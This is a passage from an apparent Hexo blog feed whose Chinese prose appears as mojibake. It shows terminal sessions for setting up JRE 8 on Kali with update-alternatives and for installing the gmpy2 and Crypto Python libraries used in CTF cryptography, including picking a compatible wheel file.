    <content type="html"><![CDATA[<p><strong>1ã€è§£å‹åˆ° <code>/opt/</code> ç›®å½•ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~/ä¸‹è½½<span class="hljs-comment"># tar -C /opt/ -zxvf jre-8u311-linux-x64.tar.gz </span><br><br>root@kali:~/ä¸‹è½½<span class="hljs-comment"># vim ~/.bashrc</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ ä»¥ä¸‹æ•°æ®ï¼ˆæ³¨æ„ç‰ˆæœ¬ä¸€è‡´ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># install JAVA JDK</span><br><span class="hljs-built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_311<br><span class="hljs-built_in">export</span> CLASSPATH=.:<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/lib<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>2ã€åŠ è½½ç¯å¢ƒå˜é‡ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~/ä¸‹è½½<span class="hljs-comment"># source ~/.bashrc</span><br><br>root@kali:~/ä¸‹è½½<span class="hljs-comment"># java -version</span><br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>java version <span class="hljs-string">&quot;1.8.0_311&quot;</span><br>Java(TM) SE Runtime Environment (build 1.8.0_311-b11)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.311-b11, mixed mode)<br><br></code></pre></td></tr></table></figure><p><strong>3ã€å®‰è£…æ³¨å†Œï¼š</strong></p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1532283">update-alternativesâ€”linuxè½¯ä»¶ç‰ˆæœ¬ç®¡ç†å‘½ä»¤ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~/ä¸‹è½½<span class="hljs-comment"># update-alternatives --config java</span><br>æœ‰ 2 ä¸ªå€™é€‰é¡¹å¯ç”¨äºæ›¿æ¢ java (æä¾› /usr/bin/java)ã€‚<br><br>  é€‰æ‹©       è·¯å¾„                                          ä¼˜å…ˆçº§  çŠ¶æ€<br>------------------------------------------------------------<br>  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      è‡ªåŠ¨æ¨¡å¼<br>  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      æ‰‹åŠ¨æ¨¡å¼<br>* 2            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      æ‰‹åŠ¨æ¨¡å¼<br><br>è¦ç»´æŒå½“å‰å€¼[*]è¯·æŒ‰&lt;å›è½¦é”®&gt;ï¼Œæˆ–è€…é”®å…¥é€‰æ‹©çš„ç¼–å·ï¼š^C<br><br>root@kali:~/ä¸‹è½½<span class="hljs-comment"># update-alternatives --install /usr/bin/java java /opt/jre1.8.0_311/bin/java 3</span><br><br>root@kali:~/ä¸‹è½½<span class="hljs-comment"># update-alternatives --config java</span><br>æœ‰ 3 ä¸ªå€™é€‰é¡¹å¯ç”¨äºæ›¿æ¢ java (æä¾› /usr/bin/java)ã€‚<br><br>  é€‰æ‹©       è·¯å¾„                                          ä¼˜å…ˆçº§  çŠ¶æ€<br>------------------------------------------------------------<br>  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      è‡ªåŠ¨æ¨¡å¼<br>  1            /opt/jre1.8.0_311/bin/java                       3         æ‰‹åŠ¨æ¨¡å¼<br>  2            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      æ‰‹åŠ¨æ¨¡å¼<br>* 3            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      æ‰‹åŠ¨æ¨¡å¼<br><br>è¦ç»´æŒå½“å‰å€¼[*]è¯·æŒ‰&lt;å›è½¦é”®&gt;ï¼Œæˆ–è€…é”®å…¥é€‰æ‹©çš„ç¼–å·ï¼š^C<br><br>root@kali:~/ä¸‹è½½<span class="hljs-comment"># update-alternatives --set java /opt/jre1.8.0_311/bin/java</span><br>update-alternatives: ä½¿ç”¨ /opt/jre1.8.0_311/bin/java æ¥åœ¨æ‰‹åŠ¨æ¨¡å¼ä¸­æä¾› /usr/bin/java (java)<br><br>root@kali:~/ä¸‹è½½<span class="hljs-comment"># update-alternatives --config java</span><br>æœ‰ 3 ä¸ªå€™é€‰é¡¹å¯ç”¨äºæ›¿æ¢ java (æä¾› /usr/bin/java)ã€‚<br><br>  é€‰æ‹©       è·¯å¾„                                          ä¼˜å…ˆçº§  çŠ¶æ€<br>------------------------------------------------------------<br>  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      è‡ªåŠ¨æ¨¡å¼<br>* 1            /opt/jre1.8.0_311/bin/java                       3         æ‰‹åŠ¨æ¨¡å¼<br>  2            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      æ‰‹åŠ¨æ¨¡å¼<br>  3            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      æ‰‹åŠ¨æ¨¡å¼<br><br>è¦ç»´æŒå½“å‰å€¼[*]è¯·æŒ‰&lt;å›è½¦é”®&gt;ï¼Œæˆ–è€…é”®å…¥é€‰æ‹©çš„ç¼–å·ï¼š^C<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>jre</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cryptoä¸­çš„å¸¸ç”¨pythonåº“</title>
    <link href="/2021/11/25/CTF/Crypto/Crypto%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8python%E5%BA%93/"/>
    <url>/2021/11/25/CTF/Crypto/Crypto%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8python%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Cryptoä¸­çš„å¸¸ç”¨pythonåº“"><a href="#Cryptoä¸­çš„å¸¸ç”¨pythonåº“" class="headerlink" title="Cryptoä¸­çš„å¸¸ç”¨pythonåº“"></a>Cryptoä¸­çš„å¸¸ç”¨pythonåº“</h1><h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install gmpy2</span><br>Collecting gmpy2<br>  Using cached gmpy2-2.0.8.zip (280 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Building wheels <span class="hljs-keyword">for</span> collected packages: gmpy2<br>  Building wheel <span class="hljs-keyword">for</span> gmpy2 (setup.py) ... error<br>  ERROR: Command errored out with <span class="hljs-built_in">exit</span> status 1:<br>   <span class="hljs-built_in">command</span>: <span class="hljs-string">&#x27;c:\users\13562\appdata\local\programs\python\python38-32\python.exe&#x27;</span> -u -c <span class="hljs-string">&#x27;import io, os, sys, setuptools, tokenize; sys.argv[0] = &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;C:\\Users\\13562\\AppData\\Local\\Temp\\pip-install-m7wq3tdn\\gmpy2_9788db52fac64496b99bd7d41369970a\\setup.py&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;; __file__=&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;C:\\Users\\13562\\AppData\\Local\\Temp\\pip-install-m7wq3tdn\\gmpy2_9788db52fac64496b99bd7d41369970a\\setup.py&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;;f = getattr(tokenize, &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;open&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;, open)(__file__) if os.path.exists(__file__) else io.StringIO(&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;from setuptools import setup; setup()&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;);code = f.read().replace(&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;\r\n&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;\n&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;);f.close();exec(compile(code, __file__, &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;exec&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;))&#x27;</span> bdist_wheel -d <span class="hljs-string">&#x27;C:\Users\13562\AppData\Local\Temp\pip-wheel-12kpn2mk&#x27;</span><br>       cwd: C:\Users\13562\AppData\Local\Temp\pip-install-m7wq3tdn\gmpy2_9788db52fac64496b99bd7d41369970a\<br>  Complete output (5 lines):<br>  running bdist_wheel<br>  running build<br>  running build_ext<br>  building <span class="hljs-string">&#x27;gmpy2&#x27;</span> extension<br>  error: Microsoft Visual C++ 14.0 is required. Get it with <span class="hljs-string">&quot;Microsoft Visual C++ Build Tools&quot;</span>: https://visualstudio.microsoft.com/downloads/<br>  ----------------------------------------<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> gmpy2<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install wheel</span><br></code></pre></td></tr></table></figure><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">Python Extension Packages for Windows - Christoph Gohlke (uci.edu)</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GMPY</span>: supports fast multiple-precision arithmetic.<br><span class="hljs-attribute">Wraps</span> the MPIR, MPFR, and MPC libraries.<br><span class="hljs-attribute">gmpy</span>â€‘<span class="hljs-number">1</span>.<span class="hljs-number">17</span>â€‘cp<span class="hljs-number">34</span>â€‘noneâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy</span>â€‘<span class="hljs-number">1</span>.<span class="hljs-number">17</span>â€‘cp<span class="hljs-number">34</span>â€‘noneâ€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy</span>â€‘<span class="hljs-number">1</span>.<span class="hljs-number">17</span>â€‘cp<span class="hljs-number">27</span>â€‘noneâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy</span>â€‘<span class="hljs-number">1</span>.<span class="hljs-number">17</span>â€‘cp<span class="hljs-number">27</span>â€‘noneâ€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">39</span>â€‘cp<span class="hljs-number">39</span>â€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">39</span>â€‘cp<span class="hljs-number">39</span>â€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">38</span>â€‘cp<span class="hljs-number">38</span>â€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">38</span>â€‘cp<span class="hljs-number">38</span>â€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">37</span>â€‘cp<span class="hljs-number">37</span>mâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">37</span>â€‘cp<span class="hljs-number">37</span>mâ€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">36</span>â€‘cp<span class="hljs-number">36</span>mâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">36</span>â€‘cp<span class="hljs-number">36</span>mâ€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">35</span>â€‘cp<span class="hljs-number">35</span>mâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">35</span>â€‘cp<span class="hljs-number">35</span>mâ€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">34</span>â€‘cp<span class="hljs-number">34</span>mâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">34</span>â€‘cp<span class="hljs-number">34</span>mâ€‘win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">27</span>â€‘cp<span class="hljs-number">27</span>mâ€‘win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>â€‘<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>â€‘cp<span class="hljs-number">27</span>â€‘cp<span class="hljs-number">27</span>mâ€‘win<span class="hljs-number">32</span>.whl<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install D:\Download\gmpy2-2.0.8-cp38-cp38-win_amd64.whl</span><br>ERROR: gmpy2-2.0.8-cp38-cp38-win_amd64.whl is not a supported wheel on this platform.<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹pipæ”¯æŒçš„æ–‡ä»¶åå’Œç‰ˆæœ¬</p><p><strong>æ–¹æ³•ä¸€ï¼šæ–°æ–¹æ³•ç¯‡</strong></p><p>ç›´æ¥ç”¨<code>pip debug --verbose</code> å‘½ä»¤å³å¯çœ‹ <strong>pip</strong> æ”¯æŒã€‚<br><strong>æ³¨ï¼š</strong> æ„Ÿè°¢ <strong>lukea</strong> å°ä¼™ä¼´çš„åˆ†äº«ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip debug --verbose</span><br>WARNING: This <span class="hljs-built_in">command</span> is only meant <span class="hljs-keyword">for</span> debugging. Do not use this with automation <span class="hljs-keyword">for</span> parsing and getting these details, since the output and options of this <span class="hljs-built_in">command</span> may change without notice.<br>pip version: pip 21.3.1 from c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\lib\site-packages\pip (python 3.8)<br>sys.version: 3.8.3 (tags/v3.8.3:6f8c832, May 13 2020, 22:20:19) [MSC v.1925 32 bit (Intel)]<br>sys.executable: c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\python.exe<br>sys.getdefaultencoding: utf-8<br>sys.getfilesystemencoding: utf-8<br>locale.getpreferredencoding: cp936<br>sys.platform: win32<br>sys.implementation:<br>  name: cpython<br><span class="hljs-string">&#x27;cert&#x27;</span> config value: Not specified<br>REQUESTS_CA_BUNDLE: None<br>CURL_CA_BUNDLE: None<br>pip._vendor.certifi.where(): c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\lib\site-packages\pip\_vendor\certifi\cacert.pem<br>pip._vendor.DEBUNDLED: False<br>vendored library versions:<br>  CacheControl==0.12.6<br>  colorama==0.4.4<br>  distlib==0.3.3<br>  distro==1.6.0<br>  html5lib==1.1<br>  msgpack==1.0.2 (Unable to locate actual module version, using vendor.txt specified version)<br>  packaging==21.0<br>  pep517==0.12.0<br>  platformdirs==2.4.0<br>  progress==1.6<br>  pyparsing==2.4.7<br>  requests==2.26.0<br>  certifi==2021.05.30<br>  chardet==4.0.0<br>  idna==3.2<br>  urllib3==1.26.7<br>  resolvelib==0.8.0<br>  setuptools==44.0.0 (Unable to locate actual module version, using vendor.txt specified version)<br>  six==1.16.0<br>  tenacity==8.0.1 (Unable to locate actual module version, using vendor.txt specified version)<br>  tomli==1.0.3<br>  webencodings==0.5.1 (Unable to locate actual module version, using vendor.txt specified version)<br>Compatible tags: 30<br>  cp38-cp38-win32<br>  cp38-abi3-win32<br>  cp38-none-win32<br>  cp37-abi3-win32<br>  cp36-abi3-win32<br>  cp35-abi3-win32<br>  cp34-abi3-win32<br>  cp33-abi3-win32<br>  cp32-abi3-win32<br>  py38-none-win32<br>  py3-none-win32<br>  py37-none-win32<br>  py36-none-win32<br>  py35-none-win32<br>  py34-none-win32<br>  py33-none-win32<br>  py32-none-win32<br>  py31-none-win32<br>  py30-none-win32<br>  cp38-none-any<br>  py38-none-any<br>  py3-none-any<br>  py37-none-any<br>  py36-none-any<br>  py35-none-any<br>  py34-none-any<br>  py33-none-any<br>  py32-none-any<br>  py31-none-any<br>  py30-none-any<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼šå¸¸è§„æ–¹æ³•ç¯‡</strong></p><p><strong>64 ä½ pip è€çš„æŸ¥çœ‹æ–¹æ³•å‰æ®µæ—¶é—´æ›´æ–°åå°±ä¸èƒ½ç”¨äº†ã€‚</strong></p><p>ä¹‹å‰å¯¼å…¥<code>pip._internal</code>å°±å¥½äº†ã€‚ç°åœ¨éœ€è¦å¯¼å…¥ <code>pip._internal.pep425tags</code> æ‰å¯ä»¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pip._internal.pep425tags<br><span class="hljs-built_in">print</span>(pip._internal.pep425tags.get_supported())<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸‰ï¼šä¸‡èƒ½æ–¹æ³•</strong></p><p>æˆ‘ä»¬ç›´æ¥åœ¨ <strong>pip</strong> é‡Œæœ <strong>pep425tags.py</strong> è¿™ä¸ªæ–‡ä»¶å°±è¡Œï¼Œæ‰¾åˆ°å®ƒçš„ä½ç½®ã€‚<br>ä¸€èˆ¬å¯¼å…¥æŠ¥é”™å°±è¯´æ˜ä½ç½®ä¸å¯¹ï¼Œæ¯ä¸ªç‰ˆæœ¬éƒ½å¯èƒ½æœ‰ä¸€äº›å·®å¼‚ï¼Œä½ç½®å¯èƒ½æœ‰å˜åŒ–ã€‚<br>æˆ‘ä¸‹è½½äº†ä¸ª <strong>32</strong> ä½çš„ï¼ŒæŸ¥æ‰¾å‘ç°äº†å®ƒçš„ä½ç½®ï¼Œç„¶åç›´æ¥å¯¼å…¥å®ƒå°±è¡Œäº†ã€‚</p><p>C:\Users\13562\AppData\Local\Programs\Python\Python38-32\Lib\site-packages\setuptools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> setuptools.pep425tags<br> <br><span class="hljs-built_in">print</span>(setuptools.pep425tags.get_supported())<br><br>[(<span class="hljs-string">&#x27;cp38&#x27;</span>, <span class="hljs-string">&#x27;cp38m&#x27;</span>, <span class="hljs-string">&#x27;win32&#x27;</span>), (<span class="hljs-string">&#x27;cp38&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;win32&#x27;</span>), (<span class="hljs-string">&#x27;py3&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;win32&#x27;</span>), (<span class="hljs-string">&#x27;cp38&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;cp3&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py38&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py3&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py37&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py36&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py35&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py34&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py33&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py32&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py31&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py30&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>)]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install D:\Download\gmpy2-2.0.8-cp38-cp38-win32.whl</span><br>Processing d:\download\gmpy2-2.0.8-cp38-cp38-win32.whl<br>Installing collected packages: gmpy2<br>Successfully installed gmpy2-2.0.8<br><br><span class="hljs-comment"># pip install gmpy2</span><br>Requirement already satisfied: gmpy2 <span class="hljs-keyword">in</span> c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\lib\site-packages (2.0.8)<br><br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>é¦–å…ˆç›´æ¥æ¢­å“ˆï¼Œå®‰è£…crypto</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> pip install crypto</span><br></code></pre></td></tr></table></figure><p>ä½†å¯¼å…¥æ—¶æ˜¾ç¤º <code>No module named &#39;Crypto&#39;</code> </p><p><a href="https://s1.ax1x.com/2020/07/28/aEYrTA.png"><img src="https://s1.ax1x.com/2020/07/28/aEYrTA.png" alt="aEYrTA.png"></a></p><p>è¿™æ—¶æˆ‘ä»¬åˆ°pythonç›®å½•ä¸‹çš„<code>Lib\site-packages</code>è·¯å¾„å¤„ï¼Œå°†åŸæœ¬çš„cryptoæ”¹æˆCryptoå³å¯</p><p><a href="https://s1.ax1x.com/2020/07/28/aEYLlT.png"><img src="https://s1.ax1x.com/2020/07/28/aEYLlT.png" alt="aEYLlT.png"></a></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/u012798683/article/details/88654534">No module named â€œCryptoâ€ï¼Œå¦‚ä½•å®‰è£…Pythonä¸‰æ–¹æ¨¡å—Crypto</a> ç¬¬ä¸€ç§æ–¹æ³•</p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto</title>
    <link href="/2021/11/20/CTF/Crypto/Crypto/"/>
    <url>/2021/11/20/CTF/Crypto/Crypto/</url>
    
